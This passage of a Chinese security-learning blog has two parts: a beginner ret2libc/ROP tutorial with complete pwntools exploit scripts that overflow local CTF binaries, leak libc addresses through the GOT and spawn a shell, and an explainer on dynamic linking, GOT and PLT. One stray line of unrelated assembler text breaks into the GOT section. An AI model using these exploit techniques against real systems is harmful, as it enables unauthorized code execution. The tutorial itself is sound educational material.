src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143551.png" alt="Pasted image 20250125143551"><br>观察源代码，发现在<code>vulnerable_function()</code>函数中，buf只有128字节而 read()函数可以读256个字节造成了缓冲区溢出。因为现在开启了DEP防护，所以不能往栈里面写入shellcode了，通过前面对动态链接的学习知道动态链接的程序在运行时才会链接共享模块，用ldd命令查看程序需要的共享模块：<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143544.png" alt="Pasted image 20250125143544"><br>程序依赖的是 libc.so.6 这个共享模块，这个共享模块里面提供了大量可以利用的函数，我们的目的是执行 system(“/bin/sh”) 来打开shell，也就是说只要在 libc 中找到了 system() 函数和 “/bin/sh” 字符串的地址就可以控制返回地址打开shell。</p><blockquote><p>这里忘关保护了，基址是错误的，exp中是正确的</p><h4 id="1-找system-函数"><a href="#1-找system-函数" class="headerlink" title="1.找system()函数"></a>1.找system()函数</h4><p>因为关闭了 ASLR ，共享库的加载基址并不会发生改变，只要知道 system() 函数在共享库中的偏移就能够算出 system() 函数在内存中的地址。使用 objdump -T libc.so.6 命令就可以显示处所有的动态链接符号表。<br><code>objdump -T libc.so.6 |grep system</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143504.png" alt="Pasted image 20250125143504"><br>system()函数偏移为0x00050430，加上基址0xed4d2000，两者相加就是这个地址就是libc加载到内存空间后 system() 函数的真实地址。</p></blockquote><h4 id="2-查找-bin-sh-字符串"><a href="#2-查找-bin-sh-字符串" class="headerlink" title="2.查找 /bin/sh 字符串"></a>2.查找 /bin/sh 字符串</h4><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125144229.png" alt="Pasted image 20250125144229"><br>同理可算出真实地址</p><h4 id="3-覆盖返回地址"><a href="#3-覆盖返回地址" class="headerlink" title="3.覆盖返回地址"></a>3.覆盖返回地址</h4><p>cyclic<br>offset为140</p><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>返回地址处放置 system() 函数的地址使当函数运行完毕时跳转到 system() 函数处继续执行，<strong>函数的调用过程是先将参数入栈，接着保存返回地址，最后call system</strong>。system_ret_addr 是 system() 函数的地址，因为我们的目的就是打开shell，<strong>所以这个返回地址随便设置 一个值就可以</strong>。binsh_addr 放置的是参数 “/bin/sh” 字符串的地址<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">sh = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x00050430</span> + <span class="number">0xf7d70000</span></span><br><span class="line"><span class="built_in">print</span>(system_addr)</span><br><span class="line">binsh_addr  = <span class="number">0x001c4de8</span> + <span class="number">0xf7d70000</span></span><br><span class="line"><span class="built_in">print</span>(binsh_addr)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">sh, payload</span>):</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn(sh, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="示例2-bss段上写’-bin-sh’"><a href="#示例2-bss段上写’-bin-sh’" class="headerlink" title="示例2(bss段上写’/bin/sh’)"></a>示例2(bss段上写’/bin/sh’)</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121126.png" alt="Pasted image 20250127121126"><br>checksec，NX开启，不能往栈上写东西<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120758.png" alt="Pasted image 20250127120758"><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120731.png" alt="Pasted image 20250127120731"><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121002.png" alt="Pasted image 20250127121002"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>payload解读：<br>首先使用112个A字符填充栈，使栈发生溢出，再用gets函数的plt地址来覆盖原返回地址，使程序流执行到gets函数，参数就是bss段的地址（bss段的变量），目的是为了使用gets函数将/bin/sh写入到bss段中。<br>接下来在使用system函数覆盖gets函数的返回地址，使程序执行到system函数，其参数也是bss段中的内容，也就是/bin/sh。<br>最后的sh.sendline(‘/bin/sh’)是为了将bss段上变量的内容替换成/bin/sh(也就是说在执行sendline(‘/bin/sh’)之前，bss段上的变量未被初始化，其内容为空）。<br>payload中第一个buf2是gets函数的参数，第二个是system的参数</p><blockquote><p>注：程序的走向是由栈来决定的</p></blockquote><h3 id="示例3（无system地址和-bin-sh地址）"><a href="#示例3（无system地址和-bin-sh地址）" class="headerlink" title="示例3（无system地址和/bin/sh地址）"></a>示例3（无system地址和/bin/sh地址）</h3><p>checksec，32位，NX开启，不能往栈上写东西<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127122302.png" alt="Pasted image 20250127122302"><br>cyclic得到偏移量为112<br>现在当务之急就是得到system函数的地址，那么我们如何得到呢？这里就主要利用了两个知识点：</p><blockquote><p>1.system函数属于libc，而<strong>libc.so动态链接库中的函数之间相对偏移是固定的</strong>。<br>2.即使程序有ASLR保护，<strong>也只是针对于地址中间位进行随机，最低的12位并不会发生改变</strong>。而libc在github上有人进行收集,如下[<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a>]</p></blockquote><p>也可以使用工具网站：[<a href="https://libc.blukat.me/]，这个网址的数据库基于libc-database">https://libc.blukat.me/]，这个网址的数据库基于libc-database</a></p><p>只要得到libc的版本，可知道system函数和/bin/sh的偏移量。知道偏移量后，再找到libc的基地址，就可以得到system函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到system的真实地址。</p><blockquote><p>libc基地址+函数偏移量＝函数真实地址</p></blockquote><p>可以泄露一个函数的真实地址，然后根据公式可以得到libc的基地址，因为知道了libc版本，就知道了函数偏移量。</p><p>我们该如何泄露函数的真实地址的，这里涉及到了libc的<strong>延迟绑定技术</strong><br>要泄露函数的真实地址，<strong><em>一般的方法是采用got表泄露，因为只要之前执行过puts函数，got表里存放着就是函数的真实地址了，这里用的是puts函数，程序里已经运行过了puts函数，真实地址已经存放到了got表内。我们得到puts函数的got地址后，可以把这个地址作为参数传递给puts函数，则会把这个地址里的数据，即puts函数的真实地址给输出出来，这样就得到了puts函数的真实地址。</em></strong></p><p>脚本如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span></span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#puts的plt表的地址，我们需要利用puts函数泄露</span></span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]<span class="comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)<span class="comment">#覆盖返回地址为puts函数</span></span><br><span class="line">payload += p32(main_plt_addr)<span class="comment">#这里是puts函数返回的地址。</span></span><br><span class="line">payload += p32(puts_got_addr)<span class="comment">#这里是puts函数的参数</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></p><p>最后理一下思路</p><ol><li>泄露puts函数的真实地址</li><li>得到libc的版本</li><li>得到system和puts和sh的偏移，计算libc基地址</li><li>计算system和sh的真实地址</li><li>构造payload为system(’/bin/sh’）</li><li>写exp<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174108.png" alt="Pasted image 20250127174108"></li></ol><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174002.png" alt="Pasted image 20250127174002"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)</span><br><span class="line">payload += p32(main_plt_addr)</span><br><span class="line">payload += p32(puts_got_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_offset = <span class="number">0x0050430</span></span><br><span class="line">sh_offset = <span class="number">0x1c4de8</span></span><br><span class="line">puts_offset = <span class="number">0x78140</span></span><br><span class="line"><span class="comment">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span></span><br><span class="line">libc_base_addr =  puts_addr-puts_offset<span class="comment">#计算出libc基地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_offset&quot;</span>,<span class="built_in">hex</span>(puts_addr-libc_base_addr))</span><br><span class="line">sys_addr = libc_base_addr + sys_offset <span class="comment">#计算出system的真实地址</span></span><br><span class="line">sh_addr = libc_base_addr + sh_offset <span class="comment">#计算出/bin/sh的真实地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(sys_addr) <span class="comment">#覆盖返回地址为system函数</span></span><br><span class="line">payload += <span class="string">b&quot;AAAA&quot;</span>  <span class="comment">#system的返回地址，随便输，因为之前调用了system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload += p32(sh_addr)  <span class="comment">#system函数参数</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><strong><em>成功getshell</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-动态链接</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="什么动态链接（Dynamic-linking）"><a href="#什么动态链接（Dynamic-linking）" class="headerlink" title="什么动态链接（Dynamic linking）"></a>什么动态链接（Dynamic linking）</h2><p><strong>动态链接</strong> 是指在程序装载时通过 <strong>动态链接器</strong> 将程序所需的所有 <strong>动态链接库(Dynamic linking library)</strong> 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），<em>当程序运行时才将他们链接在一起形成一个完整程序的过程</em>。它诞生的最主要的原因是 <strong>静态链接</strong> 太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在 <strong>静态链接</strong> 的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过 <strong>动态链接</strong> 的方式就推迟这个链接过程到了程序运行时进行。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>1、<strong>节省内存、磁盘空间</strong><br>    例如磁盘中有两个程序，p1、p2，且他们两个都包含 lib.o 这个模块，在 <strong>静态链接</strong> 的情况下他们在链接输出可执行文件时都会包含 lib.o 这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似 lib.o 这种被多个程序共享的模块时，也就会造成很大空间的浪费。<em>在 <strong>动态链接</strong> 的情况下，运行 p1 ，当系统发现需要用到 lib.o ，就会接着加载 lib.o 。这时我们运行 p2 ，就不需要重新加载 lib.o 了，因为此时 lib.o 已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个 lib.o 节省了内存空间</em>。<br>2、<strong>程序更新更简单</strong><br>    比如程序 p1 所使用的 lib.o 是由第三方提供的，等到第三方更新、或者为 lib.o 打补丁的时候，p1 就需要拿到第三方最新更新的 lib.o ，重新链接后在将其发布给用户。程序依赖的模块越多，就越发显得不方便，毕竟都是从网络上获取新资源。在 <strong>动态链接</strong> 的情况下，第三方更新 lib.o 后，理论上只需要覆盖掉原有的 lib.o ，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。<br>3、<strong>增强程序扩展性和兼容性</strong><br>    <strong>动态链接</strong> 的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的动态链接文件，以此来实现程序功能的扩展。增强兼容性是表现在 <strong>动态链接</strong> 的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，<em>如果是 <strong>静态链接</strong> 的程序会为不同平台发布不同的版本，而在 <strong>动态链接</strong> 的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了</em>。<br>总而言之，<strong>动态链接</strong> 的程序在运行时会根据自己所依赖的 <strong>动态链接库</strong> ，通过 <strong>动态链接器</strong> 将他们加载至内存中，并在此时将他们链接成一个完整的程序。<br>Linux 系统中，<strong>ELF</strong> 动态链接文件被称为 <strong>动态共享对象（Dynamic Shared Objects）</strong> ， 简称 <strong>共享对象</strong> 一般都是以 “<code>.so</code>” 为扩展名的文件；在 windows 系统中就是常常软件报错缺少<code>xxx.dll</code> 文件。</p><h3 id="GOT-Global-offset-table"><a href="#GOT-Global-offset-table" class="headerlink" title="GOT(Global offset table)"></a>GOT(Global offset table)</h3><p><strong>共享对象</strong> 在被装载时，如何确定其在内存中的地址？<br>要使 <strong>共享对象</strong> 能在任意地址装载就需要利用到 <strong>装载时重定位</strong> 的思想，即在链接时对所有的绝对地址的引用不做重定位而将这一步推迟到装载时再完成，一旦装载模块确定，系统就对所有的绝对地址引用进行重定位。但是随之而来的问题是，指令部分无法在多个进程之间共享，这又产生了一个新的技术 <strong>地址无关代码 （PIC，Position-independent Code）</strong>，该技术基本思想就是将指令中需要被修改的部分分离出来放在数据部分，这样就能保证指令部分不变且数据部分又可以在进程空间中保留一个副本，也就避免了不能节省空间的情况。那么重新定位后的程序是怎么进行数据访问和函数调用的呢？下面用实际代码验证 :</p><p>编写两个模块，一个是程序自身的代码模块，另一个是共享对象模块。以此来学习动态链接的程序是如何进行模块内、模块间的函数调用和数据访问<br><strong>编写共享文件</strong>如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">got_extern.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> b;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>编译成32位共享对象文件</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc got_extern.c -fPIC -shared -m32 -o got_extern.so</span><br></pre></td></tr></table></figure></p><blockquote><p><code>-fPIC</code> 选项是生成地址无关代码的代码，gcc 中还有另一个 -fpic 选项，差别是fPIC产生的代码较大但是跨平台性较强而fpic产生的代码较小，且生成速度更快但是在不同平台中会有限制。一般会采用fPIC选项<br><code>-shared</code> 选项是生成共享对象文件<br><code>-m32</code> 选项是编译成32位程序<br><code>-o</code> 选项是定义输出文件的名称</p></blockquote><p><strong>编写代码模块</strong>如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">got.c <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">a = <span class="number">1</span>;  </span><br><span class="line">b = <span class="number">2</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span>  </span><br><span class="line">&#123;  </span><br><span class="line">fun();  </span><br><span class="line">test();  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hey!&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>和共享模块一同编译</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc got.c ./got_extern.so -m32 -o got</span><br></pre></td></tr></table></figure><br>用 <code>objdump</code> 查看反汇编代码 <code>objdump -D -Mintel got</code>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">000011b9 &lt;fun&gt;:  </span><br><span class="line">11b9: 55 push ebp  </span><br><span class="line">11ba: 89 e5 mov ebp,esp  </span><br><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00  </span><br><span class="line">11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  </span><br><span class="line">11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2  </span><br><span class="line">11dc: 90 nop  </span><br><span class="line">11dd: 5d pop ebp  </span><br><span class="line">11de: c3 ret  </span><br><span class="line">  </span><br><span class="line">000011df &lt;main&gt;:  </span><br><span class="line">11df: 8d 4c 24 04 lea ecx,[esp+0x4]  </span><br><span class="line">11e3: 83 e4 f0 and esp,0xfffffff0  </span><br><span class="line">11e6: ff 71 <span class="built_in">fc</span> push DWORD PTR [ecx-0x4]  </span><br><span class="line">11e9: 55 push ebp  </span><br><span class="line">11ea: 89 e5 mov ebp,esp  </span><br><span class="line">11ec: 53 push ebx  </span><br><span class="line">11ed: 51 push ecx  </span><br><span class="line">11ee: e8 <span class="built_in">cd</span> fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  </span><br><span class="line">11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt; </span><br><span class="line">11fe: e8 5d fe ff ff call 1060 &lt;<span class="built_in">test</span>@plt&gt;  </span><br><span class="line">1203: 83 ec 0c sub esp,0xc  </span><br><span class="line">1206: 8d 83 08 e0 ff ff lea eax,[ebx-0x1ff8]  </span><br><span class="line">120c: 50 push eax  </span><br><span class="line">120d: e8 2e fe ff ff call 1040 &lt;<span class="built_in">printf</span>@plt&gt;  </span><br><span class="line">1212: 83 c4 10 add esp,0x10  </span><br><span class="line">1215: b8 00 00 00 00 mov eax,0x0  </span><br><span class="line">121a: 8d 65 f8 lea esp,[ebp-0x8]  </span><br><span class="line">121d: 59 pop ecx  </span><br><span class="line">121e: 5b pop ebx  </span><br><span class="line">121f: 5d pop ebp  </span><br><span class="line">1220: 8d 61 <span class="built_in">fc</span> lea esp,[ecx-0x4]  </span><br><span class="line">1223: c3 ret</span><br></pre></td></tr></table></figure></p><h4 id="模块内部调用"><a href="#模块内部调用" class="headerlink" title="模块内部调用"></a>模块内部调用</h4><p>main()函数中调用 fun()函数 ，指令为：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11f9:e8 bb ff ff ff       call   11b9 &lt;fun&gt;</span><br></pre></td></tr></table></figure><br>fun() 函数所在的地址为 0x000011b9 ，机器码 e8 代表 call 指令，为什么后面是 bb ff ff ff 而不是 b9 11 00 00 （小端存储）呢？这<em>后面的四个字节代表着目的地址相对于当前指令的下一条指令地址的偏移</em>，即 0x11f9 + 0x5 + (-69) = 0x11b9 ，0xffffffbb 是 -69 的补码形式，<em>这样做就可以使程序无论被装载到哪里都会正常执行</em>。</p><h4 id="模块内部数据访问"><a href="#模块内部数据访问" class="headerlink" title="模块内部数据访问"></a>模块内部数据访问</h4><p>ELF 文件是由很多很多的 <strong>段(segment)</strong> 所组成，常见的就如 .text (代码段) 、.data(数据段，存放已经初始化的全局变量或静态变量)、.bss(数据段，存放未初始化全局变量)等，这样就能做到数据与指令分离互不干扰。在同一个模块中，一般前面的内存区域存放着代码后面的区域存放着数据(这里指的是 .data 段)。<br><em>那么指令是如何访问远在 .data 段 中的数据呢?</em><br>观察 fun() 函数中给静态变量 a 赋值的指令：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00</span><br></pre></td></tr></table></figure><br>从上面的指令中可以看出，它先调用了 <code>__x86.get_pc_thunk.ax()</code>函数：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001224 &lt;__x86.get_pc_thunk.ax&gt;:  </span><br><span class="line">1224: 8b 04 24 mov eax,DWORD PTR [esp]  </span><br><span class="line">1227: c3 ret</span><br></pre></td></tr></table></figure><br>这个函数的作用就是把返回地址的值放到 eax 寄存器中，也就是把0x000011c1保存到eax中，然后再加上 0x2e3f ，最后再加上 0x24 。即 0x000011c1 + 0x2e3f + 0x24 = 0x4024，这个值就是相对于模块加载基址的值。通过这样就能访问到模块内部的数据。<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250124150617.png" alt="Pasted image 20250124150617"></p><h4 id="模块间数据访问"><a href="#模块间数据访问" class="headerlink" title="模块间数据访问"></a>模块间数据访问</h4><p>变量 b 被定义在其他模块中，其地址需要在程序装载时才能够确定。利用到前面的代码地址无关的思想，把地址相关的部分放入数据段中，然而这里的变量 b 的地址与其自身所在的模块装载的地址有关。解决：ELF 中在数据段里面建立了一个<strong>指向这些变量的指针数组</strong>，也就是我们所说的 <strong>GOT 表(Global offset Table， 全局偏移表 ）</strong>，它的功能就是当代码需要引用全局变量时，可以通过 GOT 表间接引用。</p><p>查看反汇编代码中是如何访问变量 b 的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00  </span><br><span class="line">11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  </span><br><span class="line">11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2</span><br></pre></td></tr></table></figure><br>计算变量 b 在 GOT 表中的位置，0x11c1 + 0x2e3f - 0x14 = 0x3fec ，查看 GOT 表的位置。</p><p>命令 objdump -h got ，查看ELF文件中的节头内容：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21 .got 00000018 00003fe8 00003fe8 00002fe8 2**2  </span><br><span class="line">CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><br>这里可以看到 .got 在文件中的偏移是 0x00003fe8，现在来看在动态连接时需要重定位的项，使用 <code>objdump -R got</code>命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00003fec R_386_GLOB_DAT    b</span><br></pre></td></tr></table></figure><br>xxxxxxxxxx7 1        　　DW      定义字(2字节).  2        PROC    定义过程.  3        ENDP    过程结束.  4        SEGMENT 定义段.  5        ASSUME  建立段寄存器寻址.  6        ENDS    段结束.  7        END    程序结束.C</p><h4 id="模块间函数调用"><a href="#模块间函数调用" class="headerlink" title="模块间函数调用"></a>模块间函数调用</h4><p>模块间函数调用用到了延迟绑定，都是函数名@plt的形式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11fe:e8 5d fe ff ff       call   1060 &lt;<span class="built_in">test</span>@plt&gt;</span><br></pre></td></tr></table></figure></p><h3 id="延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h3><p><strong>因为<em>动态链接</em>的程序是在运行时需要对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再才间接跳转</strong>，这么做势必会影响到程序的运行速度。而且程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的 <strong>延迟绑定</strong>。ELF实现 <strong>延迟绑定</strong> 是通过 <strong>PLT</strong> ，<strong>原先 